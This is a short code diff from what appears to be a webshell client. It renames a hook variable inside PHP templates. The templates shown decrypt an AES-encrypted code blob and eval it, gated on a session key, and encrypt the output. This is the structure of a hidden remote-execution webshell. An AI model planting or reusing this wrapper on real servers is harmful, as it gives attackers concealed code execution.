@@ -52,14 +52,12 @@ SUBMIT_WRAPPER_PHP = compress_phpcode_template(
     """\
 session_start();
 {decoder}
-$decoder_hooks = array();
+$eg_decoder_hooks = array();
 function decoder_echo($s) {{
-    global $decoder_hooks;
-    if (is_array($decoder_hooks)) {{
-        for($i = 0; $i < count($decoder_hooks); $i ++) {{
-            $f = $decoder_hooks[$i];
-            $s = $f($s);
-        }}
+    global $eg_decoder_hooks;
+    for($i = 0; $i < count($eg_decoder_hooks); $i ++) {{
+        $f = $eg_decoder_hooks[$i];
+        $s = $f($s);
     }}
     echo decoder_echo_raw($s);
 }}
@@ -624,7 +622,7 @@ function aes_dec($encryptedData) {
 if(!isset($_SESSION[{session_name}])){
     decoder_echo("WRONG_NO_SESSION");
 }else if(extension_loaded('openssl')) {
-    array_push($decoder_hooks, "aes_enc");
+    array_push($eg_decoder_hooks, "aes_enc");
     $code = aes_dec({code_enc});
     eval($code);
 }else{
